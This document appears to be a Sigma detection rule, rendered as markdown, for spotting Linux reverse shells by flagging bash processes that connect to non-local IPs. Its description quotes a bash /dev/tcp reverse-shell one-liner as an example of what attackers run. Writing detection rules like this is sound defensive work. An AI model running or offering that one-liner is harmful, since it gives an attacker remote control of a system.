---
type: detection_rule
title: "Linux Reverse Shell Indicator"
rule_id: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
platform: linux
level: critical
status: test
tags: [detection, sigma, linux]
mitre_tags: [attack.t1059.004]
---

# Linux Reverse Shell Indicator

## Description
Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')

## Log Source
```yaml
category: network_connection
product: linux
```

## Detection Logic
```yaml
condition: selection and not filter
filter:
  DestinationIp:
  - 127.0.0.1
  - 0.0.0.0
selection:
  Image|endswith: /bin/bash
```

## MITRE ATT&CK
- T1059.004

## False Positives
- Unknown

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

## Metadata
- **Author:** Florian Roth (Nextron Systems)
- **Date:** 2021-10-16
- **Rule ID:** `83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871`
- **Source file:** `linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml`
